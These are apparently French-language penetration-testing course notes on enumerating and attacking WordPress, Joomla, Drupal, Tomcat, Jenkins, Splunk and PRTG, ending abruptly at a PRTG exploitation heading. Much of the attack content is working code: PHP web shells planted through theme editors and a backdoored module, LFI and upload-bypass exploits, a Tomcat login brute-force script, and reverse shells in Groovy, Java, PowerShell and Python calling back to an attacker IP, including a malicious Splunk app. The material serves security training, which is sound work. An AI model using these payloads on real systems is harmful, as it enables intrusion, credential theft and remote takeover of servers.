# Content Management Systems (CMS) 
---
## WordPress – Discovery & Enumeration

### Introduction

- **WordPress** (2003) → open-source CMS, PHP-based, usually Apache + MySQL.  
- **Extremely popular**: ~32.5% of all sites on the internet.  
- **Highly customizable**, SEO-friendly → but vulnerable through **themes/plugins**.  

**Stats**:  
- 50k+ plugins, 4,100+ themes.  
- 317 versions released.  
- 661+ new WP sites built daily.  
- 120+ languages supported.  
- Hacks: **8% weak passwords**, **60% outdated installs**.  
- Vulnerabilities (per WPScan): 54% plugins, 31.5% core, 14.5% themes.  

**Big names using WordPress**: NYT, eBay, Sony, Forbes, Disney, Facebook, Mercedes-Benz.  

### Discovery / Footprinting

#### `robots.txt`
Exemple typique :
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://site.local/wp-sitemap.xml
```

- Présence de `/wp-admin` + `/wp-content` = **WordPress détecté**.  
- `/wp-admin` → redirige souvent vers `/wp-login.php`.

### Structure
- **Plugins** → `/wp-content/plugins/`  
- **Themes** → `/wp-content/themes/`  

### Types d’utilisateurs
- **Admin** → gestion complète (users, code).  
- **Editor** → gérer/publier posts (même ceux d’autres).  
- **Author** → gérer/publier ses propres posts.  
- **Contributor** → écrire posts, mais pas publier.  
- **Subscriber** → simple utilisateur (lecture + profil).  

➡️ **Accès admin = souvent RCE possible**.

## Enumeration

### Identifier WordPress
`curl -s http://blog.site.local | grep WordPress`

Exemple retour : `<meta name="generator" content="WordPress 5.8" />`

### Identifier le thème
`curl -s http://blog.site.local/ | grep themes`

Exemple retour : `.../wp-content/themes/business-gravity/...`

### Identifier les plugins
`curl -s http://blog.site.local/ | grep plugins`

Exemple retour :  
- **Contact Form 7** (`ver=5.4.2`)  
- **mail-masta** (`ver=1.0.0`)  
- **wpDiscuz** (`ver=7.0.4`)
  
## User Enumeration

- Login page : `/wp-login.php`  

- **User valide + mauvais mot de passe** →  
  `"The password for username admin is incorrect."`

- **User invalide** →  
  `"The username someone is not registered on this site."`

➡️ Fuite d’information → **username enumeration**.  

Exemple : `admin` confirmé.

## Automated Enumeration – WPScan

### Installation
`sudo gem install wpscan`

### Aide
`wpscan -h`

### Exemple scan
`sudo wpscan --url http://blog.site.local --enumerate --api-token TOKEN`

### Résultats typiques
- **Server** → Apache/2.4.41 (Ubuntu).  
- **XML-RPC enabled** → brute-force possible.  
- **readme.html exposé**.  
- **Upload dir listing enabled**.  
- **WordPress version 5.8** (vulnérable REST API, XSS).  
- **Theme Transport Gravity** (child de Business Gravity).  
- **Plugins détectés** : mail-masta (LFI, SQLi), wpDiscuz, Contact Form 7.  
- **Users** : `admin`, `john`.

## Moving On
Avec ces infos, nous pouvons maintenant :  
- Planifier l’exploitation (RCE via plugins, brute-force, LFI/SQLi).  
- Explorer la surface d’attaque restante.  
- Démontrer comment **un simple WordPress mal configuré** mène à **compromission totale**.

---

# Attaquer WordPress

## Bruteforce de connexion

WPScan peut effectuer des attaques par mot de passe (`xmlrpc` ou `wp-login`). `xmlrpc` est généralement plus rapide.

Exemple de commande :
`sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`

Sortie (exemple) :
[!] Valid Combinations Found:  
| Username: john, Password: firebird1

Options importantes :
- `--password-attack` : méthode d'attaque (`xmlrpc` ou `wp-login`)  
- `-U` : utilisateur(s) ou fichier de noms d'utilisateurs  
- `-P` : mot de passe(s) ou fichier de mots de passe  
- `-t` : threads

## Exécution de code via l’éditeur de thème

Avec un compte disposant d'un rôle suffisant (ex. `administrator`), on peut éditer les fichiers du thème depuis Appearance → Theme Editor.

Procédé :
1. Se connecter (ex. `john:firebird1`).  
2. Aller dans Appearance → Theme Editor.  
3. Choisir un thème alternatif (inactif) pour éviter d’endommager le thème principal (ex. `Twenty Nineteen`).  
4. Éditer un fichier comme `404.php` et y ajouter une ligne minimale pour exécution :

`system($_GET[0]);`

Puis appeler la page modifiée :
`curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id"`

Exemple de sortie :
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

## Module Metasploit : `wp_admin_shell_upload`

Metasploit fournit un module `exploit/unix/webapp/wp_admin_shell_upload` qui authentifie sur WordPress, upload un plugin malveillant, le déclenche et ouvre une session Meterpreter PHP.

Exemple de configuration minimale :
- `set USERNAME john`  
- `set PASSWORD firebird1`  
- `set LHOST 10.10.14.15`  
- `set RHOST 10.129.42.195`  
- `set VHOST blog.inlanefreight.local`

Après `exploit`, le module téléverse et exécute le payload ; si tout se passe bien on obtient une session Meterpreter (ou autre reverse shell).

## Exploitation de plugins connus (exemples)

### mail-masta (LFI / SQLi)
Code vulnérable (extrait) :
`include($_GET['pl']);`
Cela permet un Local File Inclusion non filtré. Exemple d'exfiltration :
`curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"`

Résultat attendu : contenu de `/etc/passwd`.

### wpDiscuz (upload bypass → RCE)
Version vulnérable : `7.0.4` (exemple). Le plugin devait seulement autoriser des images mais sa vérification MIME peut être contournée, permettant l'upload d'un webshell `.php`.

Exemple d'utilisation d'un PoC/exploit script (résumé) :
- lancer le script d'exploit ciblant la page de post : `python3 wp_discuz.py -u http://blog.inlanefreight.local -p "/?p=1"`
- si l'upload réussit, le script renvoie l'URL du webshell uploadé, ex. :  
  `http://blog.inlanefreight.local/wp-content/uploads/2021/08/nom-xxxx.php`
- exécuter une commande via :  
  `curl "http://.../nom-xxxx.php?cmd=id"`

Sortie potentielle :
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

# Joomla - Discovery & Enumeration (cheat-sheet)

**But** : repérer rapidement une instance Joomla, en tirer version / composants / points d’entrée exploitables et automatiser l’énumération.

## Quick checks (fingerprint)
- Vérifier meta generator :
  `curl -s http://TARGET/ | grep -i Joomla`
- Robots.txt (indice d’admin) :
  `curl -s http://TARGET/robots.txt | sed -n '1,40p'`
- README / manifest (version) :
  `curl -s http://TARGET/README.txt | head -n 5`
  `curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -`
- Favicon / assets : repérer `/templates/`, `/media/system/js/` et `/administrator/`.

## Common Joomla paths to check
- Admin login : `/administrator/`
- Core manifests : `/administrator/manifests/files/joomla.xml`
- Components / modules / plugins dirs :
  `/components/`, `/administrator/components/`, `/modules/`, `/plugins/`
- Uploads / public files : `/images/`, `/media/`, `/tmp/`
- Licence / readme : `/LICENSE.txt`, `/README.txt`

## Version & component detection
- `joomla.xml` (meilleur endroit) :  
  `curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -`
- Si js/css exposés : grep dans HTML pour `/media/system/js/` ou `/templates/<theme>/`
- Cache manifest : `plugins/system/cache/cache.xml`
- Joomla public stats (global) :  
  `curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool`

## Automated scanners
- **droopescan** (python3) : bon pour reconnaissance
  - install : `sudo pip3 install droopescan`
  - scan : `droopescan scan joomla --url http://TARGET/`
- **JoomlaScan** (legacy, Python2) : parfois utile pour composants anciens
  - (nécessite python2) `python2 joomlascan.py -u http://TARGET/`
- **ffuf / gobuster** pour bruteforce d’URLs :
  `ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/raft-large-directories.txt -c`

## Manual enum tips (rapide)
- Lister fichiers XML exposés :  
  `curl -s http://TARGET/ | grep -oP "/(administrator|components|templates)[^\"']+" | sort -u`
- Tester listing de répertoires : tenter `http://TARGET/wp-content/plugins/` équivalent Joomla (ex : `/templates/<name>/`)
- Chercher fichiers readme/changelog qui fuient versions :
  `curl -s http://TARGET/templates/<theme>/readme.txt | head -n 20`

## Components & vuln hunting
- Repérer composants accessibles (exemples) : `com_ajax`, `com_admin`, `com_actionlogs`
- Récupérer `component.xml` / `admin.xml` si exposés :  
  `curl -s http://TARGET/administrator/components/com_<comp>/ <...>`
- Rechercher vulnérabilités publiques (CVE) pour la version et extensions listées (CVE, Exploit-DB, GitHub)

## Bruteforce admin
- Script bruteforce (exemple) : `sudo python3 joomla-brute.py -u http://TARGET -w /path/wordlist -usr admin`
- Attention : respecter throttling & règles du scope (logs & lockouts).

## Useful one-liners / helpers
- Extraire liens intéressants :
  `curl -s http://TARGET/ | grep -oP '"(?:/administrator|/components|/templates|/plugins)[^"]+' | sort -u`
- Tester l’existence de `joomla.xml` (version) :
  `if curl -s --head http://TARGET/administrator/manifests/files/joomla.xml | head -n1 | grep -q 200; then curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -; fi`
- Récupérer toutes les URLs trouvées pour fuzzing :
  `curl -s http://TARGET/ | hxnormalize -x | hxselect -s '\n' -c a | sed 's/.*href="\([^"]*\)".*/\1/' | sort -u`

## Liens utiles (tools / ressources)
[droopescan](https://github.com/droope/droopescan) 
[JoomlaScan](https://github.com/drego85/JoomlaScan)  
[joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)

---

# Attacking Joomla

## Quick wins / reconnaissance
- Confirmer Joomla + version : `curl -s http://TARGET/ | grep -i Joomla`  
- Admin panel : `/administrator/` → tenter `http://TARGET/administrator/`  
- Vérifier fichiers manifest/readme :  
  `curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -`  
  `curl -s http://TARGET/README.txt | head -n 8`
- Chercher composants/plugins exposés : `curl -s http://TARGET/ | grep -oP '/(components|plugins|templates|administrator)[^"]+' | sort -u`

## Abusing built-in functionality (template editor → RCE)
- Si tu as des credentials admin, tu peux éditer un template et y injecter PHP (accès via UI) :
  1. Login sur `http://TARGET/administrator/`
  2. Dans l’admin : **Extensions** → **Templates** → choisir un template actif/inactif (ex : `protostar`) → **Template: Customize** (ou Editor).  
  3. Ouvrir un fichier PHP (ex : `error.php`) et ajouter :  
     - `system($_GET['cmd']);`  
       (utiliser un param nom improbable pour éviter découverte directe — ex `cmd=abcd1234;id`)  
  4. Sauver → tester :  
     `curl -s "http://TARGET/templates/protostar/error.php?cmd=id"`

**Note UI fix** : si l’admin affiche `Call to a member function format() on null`, désactiver le plugin `Quick Icon - PHP Version Check` sur `?option=com_plugins` pour voir le control panel correctement.

## Leveraging known vulnerabilities (exemples)
- CVE-2019-10945 (Joomla ≤ 3.9.4) : directory traversal & authenticated file deletion.  
  Script (exemple historique) :  
  `python2.7 joomla_dir_trav.py --url "http://TARGET/administrator/" --username admin --password admin --dir /`  
  - **Usage** : lister webroot, récupérer `configuration.php`, etc.  
  - **ATTENTION** : ce script peut détruire des fichiers si mal utilisé (option delete). N’utiliser **que** en scope autorisé.
---

# Drupal - Discovery & Enumeration

## Quick checks
- Vérifier `robots.txt` :  
  `curl -s http://TARGET/robots.txt | sed -n '1,120p'`
- Checker la présence de fichiers d'info :  
  `curl -s http://TARGET/CHANGELOG.txt`  
  `curl -s http://TARGET/README.txt`
- Vérifier l’existence du login /user/login :  
  `curl -I http://TARGET/user/login`

## Automated enumeration (droopescan)
- Installer :  
  `sudo pip3 install droopescan`
- Scan rapide :  
  `droopescan scan drupal -u http://TARGET`
- Options utiles :  
  `droopescan scan drupal -u http://TARGET --enumerate-plugins`
  
## When CHANGELOG.txt blocked
- Si `CHANGELOG.txt` 404 → se fier à `droopescan`, metadata JS/CSS, et `sites/*/*manifest*` quand accessible.

---

# Attacking Drupal

## Leveraging the PHP Filter Module

- Dans les versions < 8 : possibilité d'activer le module *PHP filter*  
- Activer le module via `Administration > Extend` (ou `Reports > Available updates` pour installer le module si Drupal 8+).  
- Créer une page Basic (Content > Add content) et choisir le format `PHP code`.  
- Exemple de snippet PHP (utiliser un paramètre non trivial) : `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`  
- Accès à la page : `http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id`  
- Pour Drupal 8+, télécharger le module PHP et l'installer : `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`

## Uploading a Backdoored Module

- Télécharger un module existant (ex. CAPTCHA), extraire et ajouter un webshell et un `.htaccess`.  
  - `wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`  
  - `tar xvf captcha-8.x-1.2.tar.gz`  
  - Créer `shell.php` : `<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>`  
  - Créer `.htaccess` :
    
    ```
    <IfModule mod_rewrite.c> 
    RewriteEngine On
    RewriteBase /
    </IfModule>
    ```
  - Ajouter `shell.php` et `.htaccess` au dossier du module, recréer l'archive : `tar cvf captcha.tar.gz captcha/`  
- Installer le module via `Manage > Extend > Install new module` (ou page d'installation) en téléversant l'archive.  
- Exécuter le shell : `http://TARGET/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

## Leveraging Known Vulnerabilities

### Drupalgeddon (CVE-2014-3704)
- Pré-auth SQL injection (Drupal 7.0 → 7.31) permettant, par PoC, la création d'un compte admin.  
- Exemple d'outil PoC : `python2.7 drupalgeddon.py -t http://TARGET -u hacker -p pwnd`  
- Résultat attendu : compte administrateur créé (login/password fournis par le script).

### Drupalgeddon2 (CVE-2018-7600)
- RCE via upload (affecte versions < 7.58 et < 8.5.1).  
- PoC courant : `python3 drupalgeddon2.py` (suivre l'outil pour upload et vérification).  
- Exemple pour écrire un webshell localement avant upload :  
  - `echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64`  
  - puis décoder et écrire : `echo 'BASE64' | base64 -d | tee mrb3n.php`  
- Vérifier l'accès : `http://TARGET/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

### Drupalgeddon3 (CVE-2018-7602)
- RCE authentifié, nécessite une session avec permission de supprimer un node.  
- Module Metasploit : `exploit(multi/http/drupal_drupageddon3)`  
- Paramètres typiques à définir :
``` 
  set RHOSTS <host>  
  set VHOST <vhost> 
  set DRUPAL_SESSION <session_cookie>
  set DRUPAL_NODE <node_id>
  set LHOST <attacker_ip>
```

- Lancer `exploit` pour obtenir une session.

---

# Servlet Containers/Software Development

---

# Tomcat - Discovery & Enumeration

## Overview
Apache Tomcat est un serveur d'applications Java (Servlets/JSP). Il est souvent présent en interne et peut révéler des informations sensibles via pages par défaut (/docs, erreur 404) ou via des managers accessibles avec des identifiants faibles.

## Discovery / Footprinting
- Identifier Tomcat via l'en-tête `Server` sur une réponse HTTP (ou via une page d'erreur qui fuit la version).
- Page docs par défaut : `/docs/` (ex. `Apache Tomcat 9 (9.0.30) - Documentation Index`).
- Exemples d'URI à vérifier :
  - `/docs/`
  - `/examples/`
  - `/manager/`
  - `/host-manager/`
  - `/manager/html` (interface web)
  - `/manager/text` (API HTTP)

## Tomcat filesystem & structure (résumé)
Arborescence typique d'une installation Tomcat :
- `bin`  
- `conf` (ex. `catalina.policy`, `context.xml`, `tomcat-users.xml`, `web.xml`)  
- `lib`  
- `logs`  
- `temp`  
- `webapps` (applications déployées : `manager`, `ROOT`, `customapp`, ...)  
- `work` (cache runtime)

Structure d'une webapp :
```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│  └── context.xml
└── WEB-INF
├── jsp/
│  └── admin.jsp
├── web.xml
├── lib/
│  └── jdbc_drivers.jar
└── classes/
└── com/inlanefreight/api/AdminServlet.class
```
- `WEB-INF/web.xml` = deployment descriptor (servlets, mappings).
- Exemple :
  - `servlet-class` `com.inlanefreight.api.AdminServlet` → fichier de classe attendu : `WEB-INF/classes/com/inlanefreight/api/AdminServlet.class`
- `WEB-INF/classes` et `WEB-INF/lib` peuvent contenir du code et des libs sensibles.

## tomcat-users.xml (credentials & roles)
- `conf/tomcat-users.xml` contient les comptes et rôles pour accéder aux pages `manager` / `host-manager`.
- Rôles usuels :
  - `manager-gui` (GUI manager)
  - `manager-script` (API HTTP)
  - `manager-jmx`
  - `manager-status`
  - `admin-gui`
- Exemple d'entrées (faibles identifiants souvent rencontrés) :
  - `<user username="tomcat" password="tomcat" roles="manager-gui" />`
  - `<user username="admin" password="admin" roles="manager-gui,admin-gui" />`

## Enumeration
- Scanner les répertoires avec Gobuster/dirbuster pour trouver `/docs`, `/manager`, `/host-manager` :
  - `gobuster dir -u http://TARGET:PORT/ -w /usr/share/wordlists/directory-list-2.3-small.txt`
- Tester accès manager avec comptes faibles : `tomcat:tomcat`, `admin:admin`, etc.
- Si authentification réussie sur `/manager`, possibilité de déployer un WAR (upload) contenant un JSP shell pour RCE.
- Endpoints manager utiles :
  - Interface web : `/manager/html`
  - API déploy/undeploy : `/manager/text` (permise selon rôle)

---
# Tomcat - Discovery & Enumeration

## Identification / Fingerprinting
- Tomcat peut apparaître via l'en-tête `Server` ou via une page d'erreur qui divulgue la version.
- `/docs` est souvent présent (ex : `Apache Tomcat 9 (9.0.30) - Documentation Index`).
- Ports courants : HTTP (8080), AJP (8009).

## Fichiers / Emplacements clés
- Arborescence habituelle :
    - `bin/`
    - `conf/` (ex : `catalina.policy`, `catalina.properties`, `context.xml`, `tomcat-users.xml`, `web.xml`)
    - `lib/`
    - `logs/`
    - `temp/`
    - `webapps/` (applications déployées : `manager`, `ROOT`, `...`)
    - `work/` (cache)
- Structure d'une application (exemple) :
    - `webapps/customapp/`
        - `index.jsp`
        - `META-INF/context.xml`
        - `WEB-INF/`
            - `web.xml` (deployment descriptor)
            - `classes/` (ex : `com/inlanefreight/api/AdminServlet.class`)
            - `lib/` (JARs)
            - `jsp/` (JSP pages)
- `WEB-INF/web.xml` contient mappages de servlets et chemins (sensible).
- `conf/tomcat-users.xml` contient utilisateurs/roles (ex : `tomcat:tomcat`, `admin:admin`).

## web.xml (exemple)
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">
    <web-app>
      <servlet>
        <servlet-name>AdminServlet</servlet-name>
        <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
      </servlet>
      <servlet-mapping>
        <servlet-name>AdminServlet</servlet-name>
        <url-pattern>/admin</url-pattern>
      </servlet-mapping>
    </web-app>

## tomcat-users.xml (extrait type)
    <tomcat-users ...>
      <role rolename="manager-gui" />
      <user username="tomcat" password="tomcat" roles="manager-gui" />
      <role rolename="admin-gui" />
      <user username="admin" password="admin" roles="manager-gui,admin-gui" />
    </tomcat-users>

## Enumeration
- Rechercher `/docs`, `/manager`, `/host-manager`.
- Exemple de scan de répertoires : `gobuster dir -u http://host:8180/ -w /usr/share/wordlists/...`
- Vérifier AJP et version : `nmap -sV -p 8009,8080 host`
- Inspecter présence des pages d'administration et fichiers de déploiement (`/manager/html`, `/host-manager`).

# Attacking Tomcat

## Tomcat Manager - Login Brute Force
- Cible : `/manager/html` (rôle `manager-gui`) ou `/host-manager`.
- Exemple Metasploit : module `auxiliary/scanner/http/tomcat_mgr_login`
    - options typiques : `VHOST`, `RPORT` (ex 8180), `rhosts`, `STOP_ON_SUCCESS true`, wordlists fournis.
- Méthode alternative :
    - arguments : `-U URL -P PATH -u USERNAMES -p PASSWORDS`
    - logique : tentative `requests.get(new_url, auth=(u,p))` et stop si `r.status_code == 200`.

### Script brute force
  ```python
    #!/usr/bin/python
    import requests
    from termcolor import cprint
    import argparse

    parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

    parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
    parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
    parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
    parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

    args = parser.parse_args()
    url = args.url
    uri = args.path
    users_file = args.usernames
    passwords_file = args.passwords

    new_url = url + uri
    f_users = open(users_file, "rb")
    f_pass = open(passwords_file, "rb")

    usernames = [x.strip() for x in f_users]
    passwords = [x.strip() for x in f_pass]

    cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

    for u in usernames:
        for p in passwords:
            r = requests.get(new_url,auth = (u, p))
            if r.status_code == 200:
                cprint("\n[+] Success!!", "green", attrs = ['bold'])
                cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
                break
        if r.status_code == 200:
            break
    if r.status_code != 200:
        cprint("\n[+] Failed!!", "red", attrs = ['bold'])
  ```

## Tomcat Manager - WAR File Upload (post-auth)
- Si accès manager GUI (`manager-gui`), possibilité de déployer un WAR (Web Application Archive).
- Créer un WAR contenant un JSP webshell (ex : `cmd.jsp`) :
    - JSP webshell example (cours) : exécute `Runtime.getRuntime().exec(request.getParameter("cmd"))` et affiche sortie.
- Packaging : `zip -r backup.war cmd.jsp`
- Déployer via `/manager/html` (Browse -> Deploy).
- Résultat : accès à `/backup/cmd.jsp?cmd=id` ou similaire.
- Alternative msfvenom : `msfvenom -p java/jsp_shell_reverse_tcp LHOST=... LPORT=... -f war > backup.war`

## Ghostcat (CVE-2020-1938)
- Vulnérabilité AJP permettant LFI semi-authenticated/unauthenticated sur versions Tomcat < 9.0.31, < 8.5.51, < 7.0.100.
- AJP service typiquement sur port 8009.
- Vérifier avec `nmap -sV -p 8009,8080 host`.
- Exploit (PoC) permet lecture de fichiers/folders dans `webapps` (ex : `WEB-INF/web.xml`).
- Exemple d'utilisation du PoC (cours) : `python2.7 tomcat-ajp.lfi.py target -p 8009 -f WEB-INF/web.xml`

# Ressources — Tomcat / outils & scripts cités
- [tomcat AJP / Ghostcat — recherche PoC sur GitHub](https://github.com/search?q=ghostcat+tomcat+ajp) 
- [script de brute-force simple mgr_brute.py](https://github.com/search?q=tomcat+mgr+brute+python)
- [exemple PoC tomcat-ajp LFI — recherche sur GitHub](https://github.com/search?q=tomcat+ajp+lfi) 

---

# Jenkins - Discovery & Enumeration

Jenkins est un serveur d'automatisation open-source (Java) utilisé pour l'intégration continue et le déploiement.

## Discovery / Footprinting

- Jenkins tourne souvent dans un conteneur servlet (ex. Tomcat) et écoute par défaut sur le port `8080`.  
- Un port supplémentaire est utilisé pour la communication master/slave (ex : `5000`).  
- Modes d'authentification possibles : base Jenkins (Jenkins’ own user database), LDAP, délégation au container, ou aucune auth.  
- Installation par défaut : base utilisateur Jenkins et généralement **inscription désactivée** (les comptes sont créés par un administrateur).  
- Détection rapide : page de connexion Jenkins (UI caractéristique) — repérer le `/login` ou l'interface web sur `:8080`.  
*Il est courant de trouver des instances internes avec des cred faibles ou sans authentification*

## Enumeration

- Vérifier l'accès HTTP(S) à l'URL Jenkins (ex. `http://HOST:8080/`) et la présence de la page de login.  
- Tester l'accès non-authentifié (parfois Jenkins est ouvert).  
- Scanner les ports pertinents : `8080` (UI), `5000` (slave port).  
- Rechercher des indices dans l'interface (version, plugins exposés via la page, endpoints REST ou script consoles si accessibles).  

---

# Jenkins - Discovery & Enumeration

Jenkins est un serveur d'intégration continue écrit en Java. Il tourne souvent dans des conteneurs servlet (ex : Tomcat) et expose par défaut l'interface web sur le port `8080` (et `5000` pour les agents/slaves). On le repère rapidement via sa page de login dédiée (`/login` ou `/jenkins`) ou en observant la page d'accueil qui retourne une UI Jenkins.

**Points clés du cours**
- Jenkins peut fonctionner sans authentification, ou avec des comptes faibles (`admin:admin`) — vérifiez toujours la page de login.
- Jenkins expose une *Script Console* accessible via `/script` qui permet d’exécuter des scripts Groovy dans le runtime Jenkins (très puissant si accessible).
- Jenkins est souvent exécuté en tant que `root` / `SYSTEM` sur certaines installations — un RCE sur le master peut donc donner des privilèges très élevés.

---

# Attacking Jenkins

## Script Console (exécution de commandes)
- Exécuter `id` (Groovy) :
```python
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
## Reverse shell Linux (Groovy)
- Exemple qui ouvre une connexion reverse vers `10.10.14.15:8443` :
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Commandes Windows simples (Groovy)
- Lister un répertoire :
    def cmd = "cmd.exe /c dir".execute();
    println("${cmd.text}");

## Reverse shell Windows / Java (Groovy snippet)
- Reverse shell Java/Groovy (remplacer `localhost` et `8044` par votre IP/port) :
```java
    String host="localhost";
    int port=8044;
    String cmd="cmd.exe";

    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);

    InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();

    while(!s.isClosed()){
        while(pi.available()>0) so.write(pi.read());
        while(pe.available()>0) so.write(pe.read());
        while(si.available()>0) po.write(si.read());
        so.flush(); po.flush();
        Thread.sleep(50);
        try { p.exitValue(); break; } catch (Exception e) {}
    };
    p.destroy(); s.close();
```
## Vulnérabilités
- Chaînage de deux vulnérabilités (`CVE-2018-1999002` + `CVE-2019-1003000`) permettant RCE *pre-auth* via contournement du sandbox de compilation des scripts.
- Contournement de l’ACL `Overall/Read` via un mécanisme de routing dynamique (permet d’exécuter un Groovy qui télécharge/charge un JAR malveillant).
- RCE en 2.150.2 via Node.js si les droits `create job` + `build` sont disponibles (auth requis, mais si `anonymous` a ces droits l’exploit réussit).

# Ressources
- [Advisory / article (Alert Logic) - Jenkins plugins RCE tracking](https://www.alertlogic.com/blog/emerging-threat-jenkins-plugins-remote-code-execution)  
- [SNYK - CVE-2019-1003000 (Script Security Plugin sandbox bypass)](https://security.snyk.io/vuln/SNYK-RHEL7-JENKINS2PLUGINS-5257791)  

---

# Infrastructure/Network Monitoring Tools
---

# Splunk - Discovery & Enumeration

## Discovery / Footprinting
- Ports/services courants :
  - Web UI : `8000` (Splunk Web)
  - Management / REST API : `8089`
- Commande utile (recon passive) :
  - `nmap -sV -p 8000,8089 <target>`
- Valeurs par défaut / faiblesse fréquente :
  - Anciennes installations : identifiants `admin:changeme`
  - Période d'essai -> conversion automatique en version Free (parfois sans authentification)

## Enumeration
- Si accès à l'UI : parcourir les Apps installées (Splunkbase), inputs configurés, alerting, et dashboards.
- Vérifier la présence de :
  - Scripted inputs (inputs exécutant des scripts périodiquement)
  - Alert scripts / saved searches qui exécutent du code côté serveur
  - Applications custom ou téléchargées depuis Splunkbase
- API : la REST API (port `8089`) permet d'interroger la configuration si authentification insuffisante.

## Risque principal & vecteurs d'abus
- **Scripte inputs / alert scripts** : mécanisme prévu pour exécution périodique de scripts (bash, python, powershell...). Si l'instance est accessible en écriture, on peut configurer un input qui exécute un script arbitraire -> exécution côté serveur.
- **Apps custom** : installer ou déployer une app mal configurée peut permettre d'exécuter code.
- **REST API / SSRF** : anciennes vulnérabilités ou mauvaise configuration peuvent exposer endpoints internes.
- **Compte admin / creds faibles** : accès admin permet déployer apps, inputs, et modifier config.

> Remarque : l'impact dépend de l'OS et du contexte d'exécution (Splunk souvent lancé en tant que `root` sur Linux ou `SYSTEM` sur Windows dans certaines déploiements).

## Exploitation
- Approche générique : si vous obtenez des droits suffisants via l'UI (admin ou équivalent), vous pouvez :
  - ajouter / modifier un scripted input pour exécuter un script contrôlé,
  - installer une app contenant un script ou composant exécutable,
  - exploiter des endpoints REST exposés si vulnérables.
- Toujours vérifier la version de Splunk et les CVE publiés (les vulnérabilités exploitables sont généralement version-spécifiques)

---

# Attacking Splunk

- **Principe**  
  Créer une app Splunk contenant un `bin/` avec script (PS / BAT / PY) + `default/inputs.conf` pour exécuter périodiquement le script → RCE.

- **Structure minimale d’app**
  - `splunk_shell/`
    - `bin/` → `run.ps1` (ou `rev.py`), `run.bat`
    - `default/` → `inputs.conf`

- **Exemples fournis (inchangés)**

  `inputs.conf` :
  - `[script://./bin/rev.py]`
  - `disabled = 0`
  - `interval = 10`
  - `sourcetype = shell`

  - `[script://.\bin\run.bat]`
  - `disabled = 0`
  - `sourcetype = shell`
  - `interval = 10`

  `run.bat` :
  - `@ECHO OFF`
  - `PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"`
  - `Exit`

  PowerShell one-liner (reverse shell exemple) :
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

  Python reverse (Linux) :
  ```
  import sys,socket,os,pty
  ip="10.10.14.15"
  port="443"
  s=socket.socket()
  s.connect((ip,int(port)))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn('/bin/bash')
  ```

- **Déploiement**
  - créer archive : `tar -cvzf updater.tar.gz splunk_shell/`
  - UI Splunk → `Install app from file` → uploader
  - listener : `nc -lnvp 443`
---

# PRTG

## Ports / services
- Interface web : `80`, `443`, `8080` (PRTG souvent sur `8080`)

## Découverte rapide
- Scan service : `nmap -sV -p- --open -T4 <host>`
- Vérifier version/page d'accueil : `curl -s http://<host>:8080/index.htm | grep prtgversion`

## Identifiants courants
- `prtgadmin:prtgadmin`
- essais fréquents : `prtgadmin:Password123`

## Vérif / énumération
1. Ouvrir UI : `http://<host>:8080`
2. Trouver version dans page HTML (`prtgversion`)  
3. Se connecter (si creds faibles ou par défaut)

## Exploitation (CVE-2018-9276) — injection de commande authentifiée (procédure minimale)
